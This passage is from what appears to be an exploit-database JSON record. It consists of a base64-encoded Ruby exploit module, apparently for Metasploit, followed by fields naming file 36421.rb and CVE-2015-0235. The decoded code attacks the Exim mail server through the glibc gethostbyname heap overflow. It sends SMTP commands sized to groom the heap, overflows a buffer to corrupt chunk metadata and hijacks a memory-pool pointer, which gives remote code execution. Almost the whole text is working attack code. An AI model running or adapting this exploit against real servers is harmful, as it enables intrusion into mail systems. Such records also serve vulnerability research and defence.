cmQgcGFydCBpcyBhdm9pZGluZzoNCiAgICAjICJUb28gbWFueSBzeW50YXggb3IgcHJvdG9jb2wgZXJyb3JzIiAoMykNCiAgICAjICJUb28gbWFueSB1bnJlY29nbml6ZWQgY29tbWFuZHMiICgzKQ0KICAgICMgIlRvbyBtYW55IG5vbm1haWwgY29tbWFuZHMiICgxMCkNCg0KICAgICMgLyA1LCBiZWNhdXNlICJceDdGIiBpcyBub24tcHJpbnQsIGFuZDoNCiAgICAjIHNzID0gc3RvcmVfZ2V0KGxlbmd0aCArIG5vbnByaW50Y291bnQgKiA0ICsgMSk7DQogICAgc210cF9zZW5kKCJCQUQxICIsICIiLCAiXHg3RiIsICIiLCAiIiwgKDE5KjEwMjQgKyBoZWFwX3NoaWZ0KSAvIDUpDQogICAgc210cF9yZWN2KDUwMCwgJ1xBNTAwIHVucmVjb2duaXplZCBjb21tYW5kXHJcblx6JykNCg0KICAgIHNtdHBfc2VuZCgiSEVMTyAiLCAiIiwgIjAiLCBAc2VuZGVyWzpob3N0YWRkcjhdLCAiIiwgNSoxMDI0KzEzLTEpDQogICAgc210cF9yZWN2KDI1MCkNCg0KICAgIHNtdHBfc2VuZCgiSEVMTyAiLCAiIiwgIjAiLCBAc2VuZGVyWzpob3N0YWRkcjhdLCAiIiwgMyoxMDI0KzEzLTEpDQogICAgc210cF9yZWN2KDI1MCkNCg0KICAgIHNtdHBfc2VuZCgiQkFEMiAiLCAiIiwgIlx4N0YiLCAiIiwgIiIsICgxMyoxMDI0ICsgMTI4KSAvIDUpDQogICAgc210cF9yZWN2KDUwMCwgJ1xBNTAwIHVucmVjb2duaXplZCBjb21tYW5kXHJcblx6JykNCg0KICAgIHNtdHBfc2VuZCgiSEVMTyAiLCAiIiwgIjAiLCBAc2VuZGVyWzpob3N0YWRkcjhdLCAiIiwgMyoxMDI0KzE2KzEzLTEpDQogICAgc210cF9yZWN2KDI1MCkNCg0KICAgICMgb3ZlcmZsb3cgKDMgYnl0ZXMpIGdldGhvc3RieW5hbWUncyBidWZmZXIsIGFuZA0KICAgICMgb3ZlcndyaXRlIGl0cyBuZXh0X2NodW5rJ3Mgc2l6ZSBmaWVsZCB3aXRoIDB4MDAzPzMxDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBeIGxhc3RfZGlnaXQNCiAgICBzbXRwX3NlbmQoIkVITE8gIiwgIiIsICIwIiwgIi4xI3tsYXN0X2RpZ2l0fSIsICIiLCA1KjEwMjQrNjQrMy0xKQ0KICAgIHNtdHBfcmVjdihIRUxPX0NPREVTKSAgICAgICAjIF4gMHgzMCB8IFBSRVZfSU5VU0UNCg0KICAgICMgYXV0aF94dGV4dGRlY29kZSgpIGlzIHRoZSBvbmx5IHdheSB0byBvdmVyd3JpdGUgdGhlIGJlZ2lubmluZyBvZiBhDQogICAgIyBjdXJyZW50X2Jsb2NrIG9mIG1lbW9yeSAodGhlICJzdG9yZWJsb2NrIiBzdHJ1Y3R1cmUpIHdpdGggYXJiaXRyYXJ5IGRhdGENCiAgICAjIChzbyB0aGF0IG91ciBoaWphY2tlZCAibmV4dCIgcG9pbnRlciBjYW4gY29udGFpbiBOVUwsIENSLCBMRiBjaGFyYWN0ZXJzKS4NCiAgICAjIHRoaXMgc2hhcGVzIHRoZSByZXN0IG9mIG91ciBleHBsb2l0OiB3ZSBvdmVyd3JpdGUgdGhlIGJlZ2lubmluZyBvZiB0aGUNCiAgICAjIGN1cnJlbnRfYmxvY2sgb2YgUE9PTF9QRVJNIG1lbW9yeSB3aXRoIHRoZSBjdXJyZW50X2Jsb2NrIG9mIFBPT0xfTUFJTg0KICAgICMgbWVtb3J5IChhbGxvY2F0ZWQgYnkgYXV0aF94dGV4dGRlY29kZSgpKS4NCg0KICAgIGF1dGhfcHJlZml4ID0gcmFuZF90ZXh0X2FscGhhKHg4NiA/IDExMjY0IDogMTEyODApDQogICAgKHg4NiA/IDQgOiA4KS50aW1lcyB7IHxpfCBhdXRoX3ByZWZpeCArPSBzcHJpbnRmKCIrJTAyeCIsICh3aGVyZSA+PiAoaSo4KSkgJiAyNTUpIH0NCiAgICBhdXRoX3ByZWZpeCArPSAiLiINCg0KICAgICMgYWxzbyBmaWxsIGxvZ19idWZmZXIgd2l0aCBhbHBoYSBjaGFycw0KICAgIHNtdHBfc2VuZCgiTUFJTCBGUk9NOjw+IEFVVEg9IiwgYXV0aF9wcmVmaXgsIG1ldGhvZCg6cmFuZF90ZXh0X2FscGhhKSwgIisiLCAiIiwgMHgzMDMwKQ0KICAgIHNtdHBfcmVjdig1MDEsICdpbnZhbGlkIGRhdGEgZm9yIEFVVEgnKQ0KDQogICAgc210cF9zZW5kKCJIRUxPICIsICJbMToyOjM6NDo1OjY6Nzo4JWV0aDA6IiwgIiAiLCAiI3t3aGF0fV0iLCAiIiwgbGVuKQ0KICAgIGJlZ2luDQogICAgICByZXBseSA9IHNtdHBfcmVjdihBTllfQ09ERSkNCiAgICAgIHJldHVybiByZXBseSBpZiByZXBseVs6Y29kZV0gIX4gLyN7SEVMT19DT0RFU30vDQogICAgICByZXR1cm4gcmVwbHkgaWYgcmVwbHlbOmNvZGVdICE9ICIyNTAiIGFuZCByZXBseVs6bGluZXNdLmZpcnN0ICF+IC9hcmd1bWVudCBkb2VzIG5vdCBtYXRjaCBjYWxsaW5nIGhvc3QvDQoNCiAgICAgIHNtdHBfc2VuZCgiTUFJTCBGUk9NOjw+IikNCiAgICAgIHJlcGx5ID0gc210cF9yZWN2KEFOWV9DT0RFKQ0KICAgICAgcmV0dXJuIHJlcGx5IGlmIHJlcGx5Wzpjb2RlXSAhPSAiMjUwIg0KDQogICAgICBzbXRwX3NlbmQoIlJDUFQgVE86PHBvc3RtYXN0ZXI+IikNCiAgICAgIHJlcGx5ID0gc210cF9yZWN2DQogICAgICByZXR1cm4gcmVwbHkNCg0KICAgIHJlc2N1ZQ0KICAgICAgcmV0dXJuIG5pbA0KICAgIGVuZA0KDQogIGVuc3VyZQ0KICAgIHNtdHBfZGlzY29ubmVjdA0KICBlbmQNCg0KICBESUdJVFMgPSAnKFswLTldfFsxLTldWzAtOV18MVswLTldWzAtOV18MlswLTRdWzAtOV18MjVbMC01XSknDQogIERPVCA9ICdbLl0nDQoNCiAgZGVmIHNtdHBfY29ubmVjdChleHBsb2l0aW5nID0gdHJ1ZSkNCiAgICBmYWlsX3dpdGgoInNtdHBfY29ubmVjdCIsICJzb2NrIGlzbid0IG5pbCIpIGlmIHNvY2sNCg0KICAgIGNvbm5lY3QNCiAgICBmYWlsX3dpdGgoInNtdHBfY29ubmVjdCIsICJzb2NrIGlzIG5pbCIpIGlmIG5vdCBzb2NrDQogICAgQHNtdHBfc3RhdGUgPSA6cmVjdg0KDQogICAgYmFubmVyID0gc210cF9yZWN2KDIyMCkNCiAgICByZXR1cm4gaWYgbm90IGV4cGxvaXRpbmcNCg0KICAgIHNlbmRlcl9ob3N0X2FkZHJlc3MgPSBkYXRhc3RvcmVbJ1NFTkRFUl9IT1NUX0FERFJFU1MnXQ0KICAgIGlmIHNlbmRlcl9ob3N0X2FkZHJlc3MgIX4gL1xBI3tESUdJVFN9I3tET1R9I3tESUdJVFN9I3tET1R9I3tESUdJVFN9I3tET1R9I3tESUdJVFN9XHovDQogICAgICBmYWlsX3dpdGgoInNtdHBfY29ubmVjdCIsICJiYWQgU0VOREVSX0hPU1RfQUREUkVTUyAobmlsKSIpIGlmIHNlbmRlcl9ob3N0X2FkZHJlc3MubmlsPw0KICAgICAgZmFpbF93aXRoKCJzbXRwX2Nvbm5lY3QiLCAiYmFkIFNFTkRFUl9IT1NUX0FERFJFU1MgKG5vdCBpbiBJUHY0IGRvdHRlZC1kZWNpbWFsIG5vdGF0aW9uKSIpDQogICAgZW5kDQogICAgc2VuZGVyX2hvc3RfYWRkcmVzc19vY3RhbCA9ICIwIiArICQxLnRvX2kudG9fcyg4KSArICIuI3skMn0uI3skM30uI3skNH0iDQoNCiAgICAjIHR1cm4gaGVsb19zZWVuIG9uIChlbmFibGUgdGhlIE1BSUwgY29tbWFuZCkNCiAgICAjIGNhbGwgc210cF92ZXJpZnlfaGVsbygpIChmb3JjZSBmb3BlbigpIGFuZCBzbWFsbCBtYWxsb2MoKXMpDQogICAgIyBjYWxsIGhvc3RfZmluZF9ieW5hbWUoKSAoZm9yY2UgZ2V0aG9zdGJ5bmFtZSdzIGluaXRpYWwgMTAyNC1ieXRlIG1hbGxvYygpKQ0KICAgIHNtdHBfc2VuZCgiSEVMTyAje3NlbmRlcl9ob3N0X2FkZHJlc3Nfb2N0YWx9IikNCiAgICByZXBseSA9IHNtdHBfcmVjdihIRUxPX0NPREVTKQ0KDQogICAgaWYgcmVwbHlbOmNvZGVdICE9ICIyNTAiDQogICAgICBmYWlsX3dpdGgoInNtdHBfY29ubmVjdCIsICJub3QgRXhpbT8iKSBpZiByZXBseVs6bGluZXNdLmZpcnN0ICF+IC9hcmd1bWVudCBkb2VzIG5vdCBtYXRjaCBjYWxsaW5nIGhvc3QvDQogICAgICBmYWlsX3dpdGgoInNtdHBfY29ubmVjdCIsICJiYWQgU0VOREVSX0hPU1RfQUREUkVTUyAoaGVsb192ZXJpZnlfaG9zdHMpIikNCiAgICBlbmQNCg0KICAgIGlmIHJlcGx5WzpsaW5lc10uZmlyc3QgPX4gL1xBMjUwIChcUyopIEhlbGxvICguKikgXFsoXFMqKVxdXHJcblx6L21uDQogICAgICBmYWlsX3dpdGgoInNtdHBfY29ubmVjdCIsICJiYWQgU0VOREVSX0hPU1RfQUREUkVTUyAoaGVsb190cnlfdmVyaWZ5X2hvc3RzKSIpIGlmIHNlbmRlcl9ob3N0X2FkZHJlc3MgIT0gJDMNCiAgICAgIHNtdHBfYWN0aXZlX2hvc3RuYW1lID0gJDENCiAgICAgIHNlbmRlcl9ob3N0X25hbWUgPSAkMg0KDQogICAgICBpZiBzZW5kZXJfaG9zdF9uYW1lID1+IC9cQSguKikgYXQgKFxTKilcei9tbg0KICAgICAgICBzZW5kZXJfaG9zdF9uYW1lID0gJDINCiAgICAgICAgc2VuZGVyX2lkZW50ID0gJDENCiAgICAgIGVsc2UNCiAgICAgICAgc2VuZGVyX2lkZW50ID0gbmlsDQogICAgICBlbmQNCiAgICAgIGZhaWxfd2l0aCgic210cF9jb25uZWN0IiwgImJhZCBTRU5ERVJfSE9TVF9BRERSRVNTIChubyBGQ3JETlMpIikgaWYgc2VuZGVyX2hvc3RfbmFtZSA9PSBzZW5kZXJfaG9zdF9hZGRyZXNzX29jdGFsDQoNCiAgICBlbHNlDQogICAgICAjIGNhbid0IGRvdWJsZS1jaGVjayBzZW5kZXJfaG9zdF9hZGRyZXNzIGhlcmUsIHNvIG9ubHkgZm9yIGFkdmFuY2VkIHVzZXJzDQogICAgICBmYWlsX3dpdGgoInNtdHBfY29ubmVjdCIsICJ1c2VyLXN1cHBsaWVkIEVITE8gZ3JlZXRpbmciKSB1bmxlc3MgZGF0YXN0b3JlWydJX0tOT1dfV0hBVF9JX0FNX0RPSU5HJ10NCiAgICAgICMgd29yc3QtY2FzZSBzY2VuYXJpbw0KICAgICAgc210cF9hY3RpdmVfaG9zdG5hbWUgPSAiQSIgKiBOU19NQVhETkFNRQ0KICAgICAgc2VuZGVyX2hvc3RfbmFtZSA9ICJBIiAqIE5TX01BWEROQU1FDQogICAgICBzZW5kZXJfaWRlbnQgPSAiQSIgKiAxMjcgKiA0ICMgc2VuZGVyX2lkZW50ID0gc3RyaW5nX3ByaW50aW5nKHN0cmluZ19jb3B5bihwLCAxMjcpKTsNCiAgICBlbmQNCg0KICAgIF9zZW5kZXIgPSBAc2VuZGVyDQogICAgQHNlbmRlciA9IHsNCiAgICAgIGhvc3RhZGRyOiBzZW5kZXJfaG9zdF9hZGRyZXNzLA0KICAgICAgaG9zdGFkZHI4OiBzZW5kZXJfaG9zdF9hZGRyZXNzX29jdGFsLA0KICAgICAgaG9zdG5hbWU6IHNlbmRlcl9ob3N0X25hbWUsDQogICAgICBpZGVudDogc2VuZGVyX2lkZW50LA0KICAgICAgX19zbXRwX2FjdGl2ZV9ob3N0bmFtZTogc210cF9hY3RpdmVfaG9zdG5hbWUNCiAgICB9DQogICAgZmFpbF93aXRoKCJzbXRwX2Nvbm5lY3QiLCAic2VuZGVyIGNoYW5nZWQiKSBpZiBfc2VuZGVyIGFuZCBfc2VuZGVyICE9IEBzZW5kZXINCg0KICAgICMgYXZvaWQgYSBmdXR1cmUgcGF0aG9sb2dpY2FsIGNhc2UgYnkgZm9yY2luZyBpdCBub3c6DQogICAgIyAiRG8gTk9UIGZyZWUgdGhlIGZpcnN0IHN1Y2Nlc3NvciwgaWYgb3VyIGN1cnJlbnQgYmxvY2sgaGFzIGxlc3MgdGhhbiAyNTYgYnl0ZXMgbGVmdC4iDQogICAgc210cF9zZW5kKCJNQUlMIEZST006IiwgIjwiLCBtZXRob2QoOnJhbmRfdGV4dF9hbHBoYSksICI+IiwgIiIsIFNUT1JFUE9PTF9NSU5fU0laRSArIDE2KQ0KICAgIHNtdHBfcmVjdig1MDEsICdzZW5kZXIgYWRkcmVzcyBtdXN0IGNvbnRhaW4gYSBkb21haW4nKQ0KDQogICAgc210cF9zZW5kKCJSU0VUIikNCiAgICBzbXRwX3JlY3YoMjUwLCAnUmVzZXQgT0snKQ0KICBlbmQNCg0KICBkZWYgc210cF9zZW5kKHByZWZpeCwgYXJnX3ByZWZpeCA9IG5pbCwgYXJnX3BhdHRlcm4gPSBuaWwsIGFyZ19zdWZmaXggPSBuaWwsIHN1ZmZpeCA9IG5pbCwgYXJnX2xlbmd0aCA9IG5pbCkNCiAgICBmYWlsX3dpdGgoInNtdHBfc2VuZCIsICJzdGF0ZSBpcyAje0BzbXRwX3N0YXRlfSIpIGlmIEBzbXRwX3N0YXRlICE9IDpzZW5kDQogICAgQHNtdHBfc3RhdGUgPSA6c2VuZGluZw0KDQogICAgaWYgbm90IGFyZ19wYXR0ZXJuDQogICAgICBmYWlsX3dpdGgoInNtdHBfc2VuZCIsICJwcmVmaXggaXMgbmlsIikgaWYgbm90IHByZWZpeA0KICAgICAgZmFpbF93aXRoKCJzbXRwX3NlbmQiLCAicGFyYW0gaXNuJ3QgbmlsIikgaWYgYXJnX3ByZWZpeCBvciBhcmdfc3VmZml4IG9yIHN1ZmZpeCBvciBhcmdfbGVuZ3RoDQogICAgICBjb21tYW5kID0gcHJlZml4DQoNCiAgICBlbHNlDQogICAgICBmYWlsX3dpdGgoInNtdHBfc2VuZCIsICJwYXJhbSBpcyBuaWwiKSB1bmxlc3MgcHJlZml4IGFuZCBhcmdfcHJlZml4IGFuZCBhcmdfc3VmZml4IGFuZCBzdWZmaXggYW5kIGFyZ19sZW5ndGgNCiAgICAgIGxlbmd0aCA9IGFyZ19sZW5ndGggLSBhcmdfcHJlZml4Lmxlbmd0aCAtIGFyZ19zdWZmaXgubGVuZ3RoDQogICAgICBmYWlsX3dpdGgoInNtdHBfc2VuZCIsICJsZW4gaXMgI3tsZW5ndGh9IikgaWYgbGVuZ3RoIDw9IDANCiAgICAgIGFyZ3VtZW50ID0gYXJnX3ByZWZpeA0KICAgICAgY2FzZSBhcmdfcGF0dGVybg0KICAgICAgd2hlbiBTdHJpbmcNCiAgICAgICAgYXJndW1lbnQgKz0gYXJnX3BhdHRlcm4gKiAobGVuZ3RoIC8gYXJnX3BhdHRlcm4ubGVuZ3RoKQ0KICAgICAgICBhcmd1bWVudCArPSBhcmdfcGF0dGVyblswLCBsZW5ndGggJSBhcmdfcGF0dGVybi5sZW5ndGhdDQogICAgICB3aGVuIE1ldGhvZA0KICAgICAgICBhcmd1bWVudCArPSBhcmdfcGF0dGVybi5jYWxsKGxlbmd0aCkNCiAgICAgIGVuZA0KICAgICAgYXJndW1lbnQgKz0gYXJnX3N1ZmZpeA0KICAgICAgZmFpbF93aXRoKCJzbXRwX3NlbmQiLCAiYXJnbGVuIGlzICN7YXJndW1lbnQubGVuZ3RofSwgbm90ICN7YXJnX2xlbmd0aH0iKSBpZiBhcmd1bWVudC5sZW5ndGggIT0gYXJnX2xlbmd0aA0KICAgICAgY29tbWFuZCA9IHByZWZpeCArIGFyZ3VtZW50ICsgc3VmZml4DQogICAgZW5kDQoNCiAgICBmYWlsX3dpdGgoInNtdHBfc2VuZCIsICJpbnZhbGlkIGNoYXIgaW4gY21kIikgaWYgY29tbWFuZC5jb3VudCgiXlx4MjAtXHg3RiIpID4gMA0KICAgIGZhaWxfd2l0aCgic210cF9zZW5kIiwgImNtZGxlbiBpcyAje2NvbW1hbmQubGVuZ3RofSIpIGlmIGNvbW1hbmQubGVuZ3RoID4gU01UUF9DTURfQlVGRkVSX1NJWkUNCiAgICBjb21tYW5kICs9ICJcbiIgIyBSRkMgc2F5cyBDUkxGLCBidXQgc3F1ZWV6ZSBhcyBtYW55IGNoYXJzIGFzIHBvc3NpYmxlIGluIHNtdHBfY21kX2J1ZmZlcg0KDQogICAgIyB0aGUgZm9sbG93aW5nIGxvb3Agd29ya3MgYXJvdW5kIGEgYnVnIGluIHRoZSBwdXQoKSBtZXRob2Q6DQogICAgIyAid2hpbGUgKHNlbmRfaWR4IDwgc2VuZF9sZW4pIiBzaG91bGQgYmUgIndoaWxlIChzZW5kX2lkeCA8IGJ1Zi5sZW5ndGgpIg0KICAgICMgKG9yIHNlbmRfaWR4IGFuZC9vciBzZW5kX2xlbiBjb3VsZCBiZSByZW1vdmVkIGFsdG9nZXRoZXIsIGxpa2UgaGVyZSkNCg0KICAgIHdoaWxlIGNvbW1hbmQgYW5kIG5vdCBjb21tYW5kLmVtcHR5Pw0KICAgICAgbnVtX3NlbnQgPSBzb2NrLnB1dChjb21tYW5kKQ0KICAgICAgZmFpbF93aXRoKCJzbXRwX3NlbmQiLCAic2VudCBpcyAje251bV9zZW50fSIpIGlmIG51bV9zZW50IDw9IDANCiAgICAgIGZhaWxfd2l0aCgic210cF9zZW5kIiwgInNlbnQgaXMgI3tudW1fc2VudH0sIGdyZWF0ZXIgdGhhbiAje2NvbW1hbmQubGVuZ3RofSIpIGlmIG51bV9zZW50ID4gY29tbWFuZC5sZW5ndGgNCiAgICAgIGNvbW1hbmQgPSBjb21tYW5kW251bV9zZW50Li4tMV0NCiAgICBlbmQNCg0KICAgIEBzbXRwX3N0YXRlID0gOnJlY3YNCiAgZW5kDQoNCiAgZGVmIHNtdHBfcmVjdihleHBlY3RlZF9jb2RlID0gbmlsLCBleHBlY3RlZF9kYXRhID0gbmlsKQ0KICAgIGZhaWxfd2l0aCgic210cF9yZWN2IiwgInN0YXRlIGlzICN7QHNtdHBfc3RhdGV9IikgaWYgQHNtdHBfc3RhdGUgIT0gOnJlY3YNCiAgICBAc210cF9zdGF0ZSA9IDpyZWN2aW5nDQoNCiAgICBmYWlsdXJlID0gY2F0Y2goOmZhaWx1cmUpIGRvDQoNCiAgICAgICMgcGFyc2UgU01UUCByZXBsaWVzIHZlcnkgY2FyZWZ1bGx5ICh0aGUgaW5mb3JtYXRpb24NCiAgICAgICMgbGVhayBpbmplY3RzIGFyYml0cmFyeSBkYXRhIGludG8gbXVsdGlsaW5lIHJlcGxpZXMpDQoNCiAgICAgIGRhdGEgPSAiIg0KICAgICAgd2hpbGUgZGF0YSAhfiAvKFxBfFxyXG4pWzAtOV17M31bIF0uKlxyXG5cei9tbg0KICAgICAgICBiZWdpbg0KICAgICAgICAgIG1vcmVfZGF0YSA9IHNvY2suZ2V0X29uY2UNCiAgICAgICAgcmVzY3VlDQogICAgICAgICAgdGhyb3coOmZhaWx1cmUsICJDYXVnaHQgI3skIS5jbGFzc306ICN7JCEubWVzc2FnZX0iKQ0KICAgICAgICBlbmQNCiAgICAgICAgdGhyb3coOmZhaWx1cmUsICJubyBtb3JlIGRhdGEiKSBpZiBtb3JlX2RhdGEubmlsPw0KICAgICAgICB0aHJvdyg6ZmFpbHVyZSwgIm5vIG1vcmUgZGF0YSIpIGlmIG1vcmVfZGF0YS5lbXB0eT8NCiAgICAgICAgZGF0YSArPSBtb3JlX2RhdGENCiAgICAgIGVuZA0KDQogICAgICB0aHJvdyg6ZmFpbHVyZSwgIm1hbGZvcm1lZCByZXBseSAoY291bnQpIikgaWYgZGF0YS5jb3VudCgiXDAiKSA+IDANCiAgICAgIGxpbmVzID0gZGF0YS5zY2FuKC8oPzpcQXxcclxuKVswLTldezN9WyAtXS4qPyg/PVxyXG4oPz1bMC05XXszfVsgLV18XHopKS9tbikNCiAgICAgIHRocm93KDpmYWlsdXJlLCAibWFsZm9ybWVkIHJlcGx5IChlbXB0eSkiKSBpZiBsaW5lcy5lbXB0eT8NCg0KICAgICAgY29kZSA9IG5pbA0KICAgICAgbGluZXMuc2l6ZS50aW1lcyBkbyB8aXwNCiAgICAgICAgbGluZXNbaV0uc3ViISgvXEFcclxuL21uLCAiIikNCiAgICAgICAgbGluZXNbaV0gKz0gIlxyXG4iDQoNCiAgICAgICAgaWYgaSA9PSAwDQogICAgICAgICAgY29kZSA9IGxpbmVzW2ldWzAsM10NCiAgICAgICAgICB0aHJvdyg6ZmFpbHVyZSwgImJhZCBjb2RlIikgaWYgY29kZSAhfiAvXEFbMC05XXszfVx6L21uDQogICAgICAgICAgaWYgZXhwZWN0ZWRfY29kZSBhbmQgY29kZSAhfiAvXEEoI3tleHBlY3RlZF9jb2RlfSlcei9tbg0KICAgICAgICAgICAgdGhyb3coOmZhaWx1cmUsICJ1bmV4cGVjdGVkICN7Y29kZX0sIGV4cGVjdGVkICN7ZXhwZWN0ZWRfY29kZX0iKQ0KICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCg0KICAgICAgICBsaW5lX2JlZ2luc193aXRoID0gbGluZXNbaV1bMCw0XQ0KICAgICAgICBsaW5lX3Nob3VsZF9iZWdpbl93aXRoID0gY29kZSArIChpID09IGxpbmVzLnNpemUtMSA/ICIgIiA6ICItIikNCg0KICAgICAgICBpZiBsaW5lX2JlZ2luc193aXRoICE9IGxpbmVfc2hvdWxkX2JlZ2luX3dpdGgNCiAgICAgICAgICB0aHJvdyg6ZmFpbHVyZSwgImxpbmUgYmVnaW5zIHdpdGggI3tsaW5lX2JlZ2luc193aXRofSwgIiBcDQogICAgICAgICAgICAgICAgICAgICAgICAgICJzaG91bGQgYmVnaW4gd2l0aCAje2xpbmVfc2hvdWxkX2JlZ2luX3dpdGh9IikNCiAgICAgICAgZW5kDQogICAgICBlbmQNCg0KICAgICAgdGhyb3coOmZhaWx1cmUsICJtYWxmb3JtZWQgcmVwbHkgKGpvaW4pIikgaWYgbGluZXMuam9pbigiIikgIT0gZGF0YQ0KICAgICAgaWYgZXhwZWN0ZWRfZGF0YSBhbmQgZGF0YSAhfiAvI3tleHBlY3RlZF9kYXRhfS9tbg0KICAgICAgICB0aHJvdyg6ZmFpbHVyZSwgInVuZXhwZWN0ZWQgZGF0YSIpDQogICAgICBlbmQNCg0KICAgICAgcmVwbHkgPSB7IGNvZGU6IGNvZGUsIGxpbmVzOiBsaW5lcyB9DQogICAgICBAc210cF9zdGF0ZSA9IDpzZW5kDQogICAgICByZXR1cm4gcmVwbHkNCiAgICBlbmQNCg0KICAgIGZhaWxfd2l0aCgic210cF9yZWN2IiwgIiN7ZmFpbHVyZX0iKSBpZiBleHBlY3RlZF9jb2RlDQogICAgcmV0dXJuIG5pbA0KICBlbmQNCg0KICBkZWYgc210cF9kaXNjb25uZWN0DQogICAgZGlzY29ubmVjdCBpZiBzb2NrDQogICAgZmFpbF93aXRoKCJzbXRwX2Rpc2Nvbm5lY3QiLCAic29jayBpc24ndCBuaWwiKSBpZiBzb2NrDQogICAgQHNtdHBfc3RhdGUgPSA6ZGlzY29ubmVjdGVkDQogIGVuZA0KZW5k", 
    "filename": "platforms/linux/remote/36421.rb", 
    "id": "36421", 
    "cves": [
        "CVE-2015-0235"
    ]
}